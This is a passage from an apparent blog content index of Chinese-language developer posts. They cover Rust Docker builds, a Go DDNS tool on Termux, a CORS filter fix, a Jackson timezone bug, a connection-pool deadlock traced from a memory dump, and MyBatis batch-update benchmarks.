class=\"string\">&quot;&#123;&#125;&quot;</span>, num)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">demo</span>() <span class=\"punctuation\">-&gt;</span> <span class=\"type\">i32</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h3 id=\"普通编译\"><a href=\"#普通编译\" class=\"headerlink\" title=\"普通编译\"></a>普通编译</h3><p>下载rust镜像</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull rust:1.72.1</span><br></pre></td></tr></table></figure>\n<p>进入容器后手动编译</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入容器</span></span><br><span class=\"line\">docker run -v $&#123;PWD&#125;:/usr/src/myapp --rm -it --entrypoint bash rust:1.72.1</span><br><span class=\"line\">cd /usr/src/myapp</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译</span></span><br><span class=\"line\">rustc demo2.rs</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">运行</span></span><br><span class=\"line\">./demo2</span><br></pre></td></tr></table></figure>\n<p>编译后正常运行。</p>\n<p>之后通过wsl运行main提示<code>./demo2: /lib/x86_64-linux-gnu/libc.so.6: version &#39;GLIBC_2.33&#39; not found (required by ./demo2)</code></p>\n<h3 id=\"通过alpine镜像编译\"><a href=\"#通过alpine镜像编译\" class=\"headerlink\" title=\"通过alpine镜像编译\"></a>通过alpine镜像编译</h3><p>下载镜像</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull rust:1.72.1-alpine3.18</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>alpine 使用的是 musl libc</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入容器</span></span><br><span class=\"line\">docker run -v $&#123;PWD&#125;:/usr/src/myapp --rm -it --entrypoint sh rust:1.72.1</span><br><span class=\"line\">cd /usr/src/myapp</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译</span></span><br><span class=\"line\">rustc demo2.rs</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">运行</span></span><br><span class=\"line\">./demo2</span><br></pre></td></tr></table></figure>\n<p>编译后正常运行。<br>然后通过wsl编译后正常运行。</p>\n<h3 id=\"添加tokio后编译（alpine编译失败）\"><a href=\"#添加tokio后编译（alpine编译失败）\" class=\"headerlink\" title=\"添加tokio后编译（alpine编译失败）\"></a>添加tokio后编译（alpine编译失败）</h3><p>使用cargo创建一个项目。添加tokio依赖<br>Cargo.toml文件</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">tokio</span> = &#123;version=<span class=\"string\">&quot;1.32.0&quot;</span>, features = [<span class=\"string\">&quot;full&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>\n<p>main.rs文件</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#[tokio::main]</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;Hello, world!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">num</span> = <span class=\"title function_ invoke__\">demo</span>().<span class=\"keyword\">await</span>;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;&#123;&#125;&quot;</span>, num)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">demo</span>() <span class=\"punctuation\">-&gt;</span> <span class=\"type\">i32</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译项目</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --rm  -v $&#123;PWD&#125;:/usr/src/myapp -w /usr/src/myapp rust:1.72.1-alpine3.18 cargo build --release</span><br></pre></td></tr></table></figure>\n<p>使用<code>alpine</code>镜像编译过程中<code>tokio-macros</code>编译失败，提示失败<code>x86_64-alpine-linux-musl/bin/ld: cannot find crti.o: No such file or directory</code>。</p>\n<p>进入容器<br>执行命令<code>find /usr/ -name crti*</code>找到文件，添加环境变量</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">LIBRARY_PATH=/usr/local/rustup/toolchains/1.72.1-x86_64-unknown-linux-musl/lib/rustlib/x86_64-unknown-linux-musl/lib/self-contained/:$LIBRARY_PATH </span><br><span class=\"line\">export LIBRARY_PATH</span><br></pre></td></tr></table></figure>\n<p>还是编译失败，提示<code> (signal: 11, SIGSEGV: invalid memory reference)</code>等信息。<br>未找到解决办法。</p>\n<h3 id=\"添加tokio后编译（改为rust-1-72-1）\"><a href=\"#添加tokio后编译（改为rust-1-72-1）\" class=\"headerlink\" title=\"添加tokio后编译（改为rust:1.72.1）\"></a>添加tokio后编译（改为rust:1.72.1）</h3><p>一样的编译流程</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --rm  -v $&#123;PWD&#125;:/usr/src/myapp -w /usr/src/myapp rust:1.72.1 cargo build --release</span><br></pre></td></tr></table></figure>\n<p>编译成功后，在wsl里面运行和之前出现一样的错误<code>./demo2: /lib/x86_64-linux-gnu/libc.so.6: version &#39;GLIBC_2.33&#39; not found (required by ./demo2)</code></p>\n<p>进入容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -v $&#123;PWD&#125;:/usr/src/myapp --rm -it --entrypoint bash rust:1.72.1</span><br><span class=\"line\">cd /usr/src/myapp</span><br><span class=\"line\">rustup target add x86_64-unknown-linux-musl</span><br><span class=\"line\">cargo build --release --target=x86_64-unknown-linux-musl</span><br></pre></td></tr></table></figure>\n<p>编译成功，切换到wsl在<code>target/x86_64-unknown-linux-musl</code>执行编译后文件正常。</p>\n<h3 id=\"待处理\"><a href=\"#待处理\" class=\"headerlink\" title=\"待处理\"></a>待处理</h3><p>可以自己创建镜像然后添加命令<code>rustup target add x86_64-unknown-linux-musl</code>，生成自定义镜像，以免每次需要下载。</p>\n","categories":["rust"],"tags":["docker","rust"]},{"title":"Golang编译安卓可执行文件","url":"/2023/10/11/Golang%E7%BC%96%E8%AF%91%E5%AE%89%E5%8D%93%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/","content":"<p>一部旧手机在家发挥余热，安装Termux后，希望手机能自动更新DNS解析，方便远程访问家里网络。<br>最开始使用Python完成，为了方便能直接运行，用Go做了重新实现。</p>\n<p>实现逻辑是，通过<code>https://4.ipw.cn</code>获取当前IP，然后通过阿里云SDK去检查IP是否一致，不一致则更新。</p>\n<span id=\"more\"></span>\n<p>编译脚本</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">SET</span> CGO_ENABLED=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"built_in\">SET</span> GOOS=android</span><br><span class=\"line\"><span class=\"built_in\">SET</span> GOARCH=arm64</span><br><span class=\"line\">go build -o .\\out\\ .\\<span class=\"built_in\">cmd</span>\\homeddns\\</span><br></pre></td></tr></table></figure>\n<p>编译成功后在Termux上执行异常。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Get &quot;https://4.ipw.cn&quot;: dial tcp: lookup 4.ipw.cn on [::1]:53: read udp [::1]:48523-&gt;[::1]:53: read: connection refused</span><br></pre></td></tr></table></figure>\n<p>DNS解析的问题，问题原因可以看</p>\n<blockquote>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rlcm11eC90ZXJtdXgtYXBwL2lzc3Vlcy84NjkjaXNzdWVjb21tZW50LTQzMzk4NTUyMw==\">https://github.com/termux/termux-app/issues/869#issuecomment-433985523<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvbGFuZy9nby9pc3N1ZXMvODg3Nw==\">https://github.com/golang/go/issues/8877<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n</blockquote>\n<p>解决办法，使用proot解决</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">pkg install proot</span><br></pre></td></tr></table></figure>\n<p>执行命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">proot -b $PREFIX/etc/resolv.conf:/etc/resolv.conf ./homeddns</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>希望golang log打印输出到文件，直接使用 &gt;&gt; ddns.log是不生效的，使用  2&gt;&gt; ddns.log生效</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTk5NjU3OTUvaG93LXRvLXdyaXRlLWxvZy10by1maWxl\">https://stackoverflow.com/questions/19965795/how-to-write-log-to-file<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n</blockquote>\n<p>因为代码有阿里云授权key，所以不能写死在代码里。<br>解决办法是<br>在main方法里面定义变量<br>打包时添加参数</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\">-ldflags &quot;-X &#x27;main.keyId=xxx&#x27; -X &#x27;main.keySecret=xxx&#x27; -X &#x27;main.recordId=xxx&#x27;&quot;</span><br></pre></td></tr></table></figure>\n","categories":["Go"],"tags":["Go","Android","DDns","Termux"]},{"title":"记一次跨域处理","url":"/2023/10/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%A8%E5%9F%9F%E5%A4%84%E7%90%86/","content":"<p>跨域问题解决有多种，一般直接在服务端配置运行跨域即可。</p>\n<p>项目以前是普通的Spring项目，通过Tomcat启动，之后改为springboot。<br>正常应该是配置filter运行跨域即可。再项目上线后发现跨域不生效，经过排查后发现项目改造不完整</p>\n<ol>\n<li>本地开发是通过main方法启动，但是发布的服务器上是打包为war后启动</li>\n<li>保留了web.xml文件，跨域配置在spring容器中不生效。</li>\n</ol>\n<p>解决办法就是把filter改到web.xml即可。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">HttpServletRequest</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> (HttpServletRequest) servletRequest;</span><br><span class=\"line\"><span class=\"type\">HttpServletResponse</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> (HttpServletResponse) servletResponse;</span><br><span class=\"line\">response.setHeader(<span class=\"string\">&quot;Access-Control-Allow-Origin&quot;</span>, <span class=\"string\">&quot;*&quot;</span>);</span><br><span class=\"line\">response.setHeader(<span class=\"string\">&quot;Access-Control-Allow-Methods&quot;</span>, <span class=\"string\">&quot;GET, HEAD, POST, PUT, DELETE, OPTIONS, PATCH&quot;</span>);</span><br><span class=\"line\">response.setHeader(<span class=\"string\">&quot;Access-Control-Allow-Headers&quot;</span>, <span class=\"string\">&quot;*&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"string\">&quot;OPTIONS&quot;</span>.equals(request.getMethod())) &#123;</span><br><span class=\"line\">    response.setStatus(HttpServletResponse.SC_ACCEPTED);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">filterChain.doFilter(servletRequest, servletResponse);</span><br></pre></td></tr></table></figure>\n\n<p>改造实现filter过程中也出现了一次异常。因为<code>javax.servlet-api</code>(provided)使用的版本比较高，filter的<code>init</code>和<code>destroy</code>是默认方法，所以实现类没有实现这两个方法，导致启动后一直报错。</p>\n","categories":["问题"],"tags":["跨域"]},{"title":"一次接口时间序列化返回时区错误","url":"/2023/11/07/%E4%B8%80%E6%AC%A1%E6%8E%A5%E5%8F%A3%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%94%E5%9B%9E%E6%97%B6%E5%8C%BA%E9%94%99%E8%AF%AF/","content":"<p>最近使用一个springboot项目采用默认的jackson序列化，配置参数如下</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">spring.jackson.default-property-inclusion</span>=<span class=\"string\">non_null</span></span><br><span class=\"line\"><span class=\"attr\">spring.jackson.date-format</span>=<span class=\"string\">yyyy-MM-dd HH:mm:ss</span></span><br><span class=\"line\"><span class=\"attr\">spring.jackson.deserialization.read-unknown-enum-values-as-null</span>=<span class=\"string\">true</span></span><br></pre></td></tr></table></figure>\n<p>设置好后发现返回的Date类型，数据库时间是<strong>2023-11-06 16:24:40</strong>返回的时间是<strong>2023-11-06 08:24:40</strong>，时间少了8小时。<br>最开始以为是数据库采用PostgreSQL导致数据存储的时间有问题，查看数据库后数据正常。对数据进行debug后，找到是因为jackson对时间格式化时，采用的时区有误。</p>\n<span id=\"more\"></span>\n<p>源码位置<br><em>org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration.Jackson2ObjectMapperBuilderCustomizerConfiguration.StandardJackson2ObjectMapperBuilderCustomizer#configureDateFormat</em></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">dateFormat</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.jacksonProperties.getDateFormat();</span><br><span class=\"line\"><span class=\"keyword\">if</span> (dateFormat != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        Class&lt;?&gt; dateFormatClass = ClassUtils.forName(dateFormat, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        builder.dateFormat((DateFormat) BeanUtils.instantiateClass(dateFormatClass));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class=\"line\">        <span class=\"type\">SimpleDateFormat</span> <span class=\"variable\">simpleDateFormat</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(dateFormat);</span><br><span class=\"line\">        <span class=\"comment\">// Since Jackson 2.6.3 we always need to set a TimeZone (see</span></span><br><span class=\"line\">        <span class=\"comment\">// gh-4170). If none in our properties fallback to the Jackson&#x27;s</span></span><br><span class=\"line\">        <span class=\"comment\">// default</span></span><br><span class=\"line\">        <span class=\"type\">TimeZone</span> <span class=\"variable\">timeZone</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.jacksonProperties.getTimeZone();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (timeZone == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            timeZone = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectMapper</span>().getSerializationConfig().getTimeZone();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        simpleDateFormat.setTimeZone(timeZone);</span><br><span class=\"line\">        builder.dateFormat(simpleDateFormat);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看源码可知，配置格式化是支持配置DateFormat类的，也支持时间格式化配置。<br>如果使用时间格式化配置，默认取的是<strong>com.fasterxml.jackson.databind.cfg.BaseSettings#DEFAULT_TIMEZONE</strong>时区是UTC。导致序列化后的时间少了8小时。</p>\n<p>解决办法：</p>\n<h4 id=\"Date改为LocalDateTime\"><a href=\"#Date改为LocalDateTime\" class=\"headerlink\" title=\"Date改为LocalDateTime\"></a>Date改为LocalDateTime</h4><p>修改序列号Date类型为LocalDataTime，类型改后配置的时间格式化会不生效，需要注册Bean来序列化LocalDataTime</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"meta\">@ConditionalOnProperty(name = &quot;spring.jackson.date-format&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> Jackson2ObjectMapperBuilderCustomizer <span class=\"title function_\">jackson2ObjectMapperBuilderCustomizer</span><span class=\"params\">(<span class=\"meta\">@Value(&quot;$&#123;spring.jackson.date-format&#125;&quot;)</span> String format)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> builder -&gt; &#123;</span><br><span class=\"line\">        <span class=\"comment\">//LocalDateTime</span></span><br><span class=\"line\">        <span class=\"type\">DateTimeFormatter</span> <span class=\"variable\">dateTimeFormatter</span> <span class=\"operator\">=</span> DateTimeFormatter.ofPattern(format);</span><br><span class=\"line\">        builder.deserializers(<span class=\"keyword\">new</span> <span class=\"title class_\">LocalDateTimeDeserializer</span>(dateTimeFormatter));</span><br><span class=\"line\">        builder.serializers(<span class=\"keyword\">new</span> <span class=\"title class_\">LocalDateTimeSerializer</span>(dateTimeFormatter));</span><br><span class=\"line\">        <span class=\"comment\">//DateTime</span></span><br><span class=\"line\">        <span class=\"comment\">//DateTimeFormatter dateFormatter = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd&quot;);</span></span><br><span class=\"line\">        <span class=\"comment\">//builder.serializers(new LocalDateSerializer(dateFormatter));</span></span><br><span class=\"line\">        <span class=\"comment\">//builder.deserializers(new LocalDateDeserializer(dateFormatter));</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"添加时区配置\"><a href=\"#添加时区配置\" class=\"headerlink\" title=\"添加时区配置\"></a>添加时区配置</h4><figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">spring.jackson.time-zone</span>=<span class=\"string\">Asia/Singapore</span></span><br></pre></td></tr></table></figure>\n<p>添加对应时区配置即可。</p>\n<p>注：<br>在使用IDEA连接PostgreSQL时，如果表字段设计的是默认current_timestamp，添加数据时会使用UTC时区，导致数据比实际时间少8小时。<br>解决办法，在连接配置中添加JVM参数，配置数据库连接时区。</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">-Duser.timezone</span>=<span class=\"string\">Asia/Singapore</span></span><br></pre></td></tr></table></figure>\n\n","tags":["问题"]},{"title":"一次内存dump排查记录","url":"/2023/12/08/%E4%B8%80%E6%AC%A1%E5%86%85%E5%AD%98dump%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%95/","content":"<h3 id=\"初步分析\"><a href=\"#初步分析\" class=\"headerlink\" title=\"初步分析\"></a>初步分析</h3><p>最近一个应用一直提示获取连接超时，找运维dump内存后分析原因。<br>在开始前就猜到了大概率是因为某个sql超长时间执行导致连接不释放，导致连接池占用满了。</p>\n<p>项目使用的tomcat-jdbc连接池。<br>直接查oql</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> t <span class=\"keyword\">from</span> org.apache.tomcat.jdbc.pool.PooledConnection t</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>得到返回的20池连接对象。点开池连接后可以看到对象详细信息。<br>对象<strong>org.apache.tomcat.jdbc.pool.PooledConnection</strong>是由<strong>org.apache.tomcat.jdbc.pool.ProxyConnection</strong>所持有。<br>一直往上查，查到<strong>org.apache.tomcat.jdbc.pool.StatementFacade$StatementProxy</strong>。<br><img src=\"/images/2023/12/%E4%B8%80%E6%AC%A1%E5%86%85%E5%AD%98dump%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%9501.png\"><br>打开改对象后，可以查到改连接正在执行的sql。<br><img src=\"/images/2023/12/%E4%B8%80%E6%AC%A1%E5%86%85%E5%AD%98dump%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%9502.png\"></p>\n<p>直接使用oql查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select t from org.apache.tomcat.jdbc.pool.StatementFacade$StatementProxy t</span><br></pre></td></tr></table></figure>\n<p>可以查到正在执行的和待执行的sql。<br>通过分析连接池时间戳可以看出sql开始执行时间。</p>\n<h3 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h3><p>我们是有配置连接清理的，如果连接未正常被回收，理论上应该被清理。<br>通过分析线程栈可以找到驱动执行的地方如下:<br><img src=\"/images/2023/12/%E4%B8%80%E6%AC%A1%E5%86%85%E5%AD%98dump%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%9503.png\" alt=\"线程栈\"><br>找到代码所在如下:<br><img src=\"/images/2023/12/%E4%B8%80%E6%AC%A1%E5%86%85%E5%AD%98dump%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%9504.png\" alt=\"执行\"><br>在执行sql时，会先锁住时间数据库连接，然后执行对应操作。</p>\n<blockquote>\n<p>锁住的对象是oracle.jdbc.driver.PhysicalConnection</p>\n</blockquote>\n<p>对于清理线程<strong>org.apache.tomcat.jdbc.pool.ConnectionPool.PoolCleaner</strong>清理，可以通过线程栈查看调用<br><img src=\"/images/2023/12/%E4%B8%80%E6%AC%A1%E5%86%85%E5%AD%98dump%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%9505.png\" alt=\"清理线程\"><br>查看最终清理源码如下<br><img src=\"/images/2023/12/%E4%B8%80%E6%AC%A1%E5%86%85%E5%AD%98dump%E6%8E%92%E6%9F%A5%E8%AE%B0%E5%BD%9506.png\" alt=\"清理\"><br>做close的时候会去获取真实连接<strong>PhysicalConnection</strong>的锁，前面所知在执行sql的时候会锁住连接，直到执行完后释放sql，清理的时候也需要获取锁导致一直在等待，清理线程也卡住。</p>\n<p>理下流程，现有某个sql超长时间执行，清理线程触发清理后，因为获取不到锁导致清理线程也卡住了。<br>通过分析数据库连接时间戳发现该sql执行了几天还未执行完，未定位到是什么原因导致sql异常执行超长时间卡住，是否事务未关闭或者其他数据库原因，因为项目已经重启没法查看连接状况。</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>上面最开始找到了执行超长的sql，把卡住的sql导出后，发现文件小的有几百kb，大的有1M多，可能因为里面有很多空白行。<br>原本逻辑是通过foreach拼接了sql，导致生成了一个巨大的sql。<br>现在先改为单sql批量提交看是否可以解决这个问题，改为单sql在性能上好像不如一个大sql，这需要后续做测试才能肯定。</p>\n","tags":["异常","内存dump"]},{"title":"mybatis批量更新比对","url":"/2023/12/12/mybatis%E6%89%B9%E9%87%8F%E6%9B%B4%E6%96%B0%E6%AF%94%E5%AF%B9/","content":"<p>上次发现因为数据库获取新的连接超时，其实是对数据做存在更新不存在做插入。想到对于更新不同数据速度相差多少。</p>\n<p>暂时有4种更新方法。<br><strong>一个个更新</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">update simple set code=#&#123;item.code&#125;</span><br><span class=\"line\">where id = #&#123;item.id&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>采用batch批量更新</strong>，sql如上，只是批量提交请求。<br><strong>拼装更新sql为一个大的sql</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foreach</span> <span class=\"attr\">collection</span>=<span class=\"string\">&quot;datas&quot;</span> <span class=\"attr\">item</span>=<span class=\"string\">&quot;item&quot;</span> <span class=\"attr\">separator</span>=<span class=\"string\">&quot;;&quot;</span>&gt;</span></span><br><span class=\"line\">    update simple set code=#&#123;item.code&#125;</span><br><span class=\"line\">    where id = #&#123;item.id&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">foreach</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>对于mysql，需要添加<strong>allowMultiQueries&#x3D;true</strong>参数</p>\n</blockquote>\n<p><strong>采用临时表关联更新</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">update simple t,</span><br><span class=\"line\">(</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foreach</span> <span class=\"attr\">collection</span>=<span class=\"string\">&quot;datas&quot;</span> <span class=\"attr\">item</span>=<span class=\"string\">&quot;item&quot;</span> <span class=\"attr\">separator</span>=<span class=\"string\">&quot; UNION ALL &quot;</span>&gt;</span></span><br><span class=\"line\">    select #&#123;item.id&#125; as id, #&#123;item.code&#125; as code</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">foreach</span>&gt;</span></span><br><span class=\"line\">) v</span><br><span class=\"line\">set t.code = v.code</span><br><span class=\"line\">where t.id = v.id</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h3 id=\"单线程性能比较\"><a href=\"#单线程性能比较\" class=\"headerlink\" title=\"单线程性能比较\"></a>单线程性能比较</h3><table>\n<thead>\n<tr>\n<th></th>\n<th>单个更新</th>\n<th>批量提交</th>\n<th>拼装sql</th>\n<th>临时表</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>10w&#x2F;1k</td>\n<td>122.9</td>\n<td>63.99</td>\n<td>13.2</td>\n<td>3.87</td>\n</tr>\n</tbody></table>\n<p>采用的数据量是10w条数据，随机更新10w次，对于批量更新一次提交1000条数据，因为对比结果相差较大，多次测试同类型时间大致相差不大，未统计每次的数据<br>后续测试了100w条数据更新10w次，比对结果差不多。</p>\n<h3 id=\"多线程性能比较\"><a href=\"#多线程性能比较\" class=\"headerlink\" title=\"多线程性能比较\"></a>多线程性能比较</h3><table>\n<thead>\n<tr>\n<th>总数&#x2F;单次</th>\n<th>单个更新</th>\n<th>批量提交</th>\n<th>拼装sql</th>\n<th>临时表</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1w&#x2F;1k</td>\n<td>68.44</td>\n<td>57.37</td>\n<td>45.23</td>\n<td>出现死锁</td>\n</tr>\n<tr>\n<td>1w&#x2F;10</td>\n<td>-</td>\n<td>-</td>\n<td>-</td>\n<td>8.25</td>\n</tr>\n</tbody></table>\n<p>采用的数据量是10w条数据，随机更新1w次。对于临时表更新（一次1000），出现了死锁，应该是不同的线程里面更新的数据有一样的导致。改为10条后，多次测试未出现死锁，应该是一次更新数据量少了后，不容易重复。</p>\n<blockquote>\n<p>多线程比对的时候需要设置自动提交，避免死锁。</p>\n</blockquote>\n<h3 id=\"普通索引更新（单线程）\"><a href=\"#普通索引更新（单线程）\" class=\"headerlink\" title=\"普通索引更新（单线程）\"></a>普通索引更新（单线程）</h3><table>\n<thead>\n<tr>\n<th>总数&#x2F;单次</th>\n<th>单个更新</th>\n<th>批量提交</th>\n<th>拼装sql</th>\n<th>临时表</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>10w&#x2F;1k</td>\n<td>445.71</td>\n<td>1178.84</td>\n<td>343.24</td>\n<td>4.31</td>\n</tr>\n<tr>\n<td>1w&#x2F;1k</td>\n<td>47.67</td>\n<td>42.36</td>\n<td>35.25</td>\n<td>1.13</td>\n</tr>\n<tr>\n<td>1w&#x2F;100</td>\n<td>46.73</td>\n<td>41.52</td>\n<td>100.46</td>\n<td>1.63</td>\n</tr>\n</tbody></table>\n<ul>\n<li>?建立普通索引后，如果普通索引更新字段结果如上，对于批量提交<strong>10w&#x2F;1k</strong>耗时异常长（多次测试），暂时未找到原因。</li>\n</ul>\n<h3 id=\"普通索引更新（多线程）\"><a href=\"#普通索引更新（多线程）\" class=\"headerlink\" title=\"普通索引更新（多线程）\"></a>普通索引更新（多线程）</h3><table>\n<thead>\n<tr>\n<th>总数&#x2F;单次</th>\n<th>单个更新</th>\n<th>批量提交</th>\n<th>拼装sql</th>\n<th>临时表</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1w&#x2F;1k</td>\n<td>71.47</td>\n<td>68.44</td>\n<td>47.59</td>\n<td>死锁</td>\n</tr>\n<tr>\n<td>1w&#x2F;100</td>\n<td>68.24</td>\n<td>59.68</td>\n<td>44.97</td>\n<td>死锁</td>\n</tr>\n<tr>\n<td>1w&#x2F;10</td>\n<td>-</td>\n<td>-</td>\n<td>-</td>\n<td>9.03</td>\n</tr>\n</tbody></table>\n<p>对于多线程版本，比对和主键相差不太大</p>\n<h3 id=\"唯一索引（单线程）\"><a href=\"#唯一索引（单线程）\" class=\"headerlink\" title=\"唯一索引（单线程）\"></a>唯一索引（单线程）</h3><p>和普通索引差不多，批量提交一样耗时异常长。</p>\n<h3 id=\"唯一索引（多线程）\"><a href=\"#唯一索引（多线程）\" class=\"headerlink\" 